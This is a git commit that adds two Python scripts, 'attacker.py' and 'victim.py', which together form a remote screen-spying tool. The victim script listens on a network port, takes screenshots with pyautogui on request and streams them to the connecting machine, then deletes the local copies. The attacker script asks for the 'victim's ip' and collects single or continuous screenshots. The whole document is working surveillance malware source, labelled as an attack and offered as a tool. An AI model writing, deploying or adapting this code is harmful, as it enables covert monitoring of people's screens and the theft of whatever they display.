02a68f8140006732552dad81ea8b62c45eade409
y0g3sh-99 <59962466+y0g3sh-99@users.noreply.github.com>
2020-04-19 22:45:32 +0530

    Add files via upload

---
+++ attacker.py
@@ -0,0 +1,62 @@
+import socket
+import time
+
+def get_remote_screenshot(s):
+	filename = s.recv(30)
+	f=open(filename,"wb")
+	while True:
+		try:
+			data=s.recv(1000000)
+		except:
+			break
+		if not data:
+			break
+		f.write(data)
+	f.close()
+	print ("Received screenshot %s\n")%filename
+
+
+try:
+	ip = raw_input("\nEnter victim's ip address: ")
+	port = raw_input("\nEnter vitim's port to connect (default 54321): ")
+	if port == '':
+		port = 54321
+	else:
+		port = int(port)
+
+	while True:
+		print ("1. Take screenshot\n2. Take screenshot countinuously\nEnter Ctrl+c to exit program.")
+		choice = raw_input("\nEnter your choice: ")
+		if not choice.isdigit() or (choice is not '1' and choice is not '2'):
+			print ("Enter proper choice...")
+			continue
+		if int(choice) == 1:
+			s=socket.socket()
+			s.settimeout(2)
+			s.connect((ip,port))
+			s.send(choice)
+			get_remote_screenshot(s)
+			s.close()
+		elif int(choice) == 2:
+			interval = raw_input("Enter time interval between continuos screenshots (in int seconds): ")
+			s=socket.socket()
+			s.settimeout(2)
+			s.connect((ip,port))
+			s.send(choice)
+			s.send(interval)
+			while True:
+				get_remote_screenshot(s)
+				if int(interval) > 2:
+ 					time.sleep(int(interval)-2) 
+				else: 
+					time.sleep(int(interval))
+				s.send("ok")
+except KeyboardInterrupt:
+	s.close()
+	print ("Program terminated")
+except:
+	print ("Something went wrong, check all inputs, socket connection")
+
+
+
+
---
+++ victim.py
@@ -0,0 +1,50 @@
+import time
+import socket
+import os
+import glob
+import pyautogui
+
+def send_screenshot(conn):
+    filename = time.ctime() + ".jpeg"
+    filename = filename.replace(':', '.')
+    sc=pyautogui.screenshot(filename)
+    conn.sendall(filename)
+    f=open(filename,"rb")
+    data=f.read()
+    conn.sendall(data)
+    f.close()
+    os.remove(filename)
+    print ("Sent screenshot %s")%filename
+
+try:
+    s=socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("0.0.0.0",54321))
+    s.listen(5)
+    print ("Server listening...")
+    while True:
+        conn, addr = s.accept()
+        print ("Client connected: %s") % addr[0]
+        choice = conn.recv(10)
+        if int(choice) == 1:
+            try:
+                send_screenshot(conn)
+            except:
+                break
+        elif int(choice) == 2:
+            interval = int(conn.recv(10))
+            while True:
+                try:
+                    send_screenshot(conn)
+                    time.sleep(interval)
+                    temp=conn.recv(3)
+                except:
+                    break
+        print ("%s got disconnected")%addr[0]
+        for i in glob.glob("*.jpeg"):
+            os.remove(i)
+            
+except:
+    s.close()
+            
+        
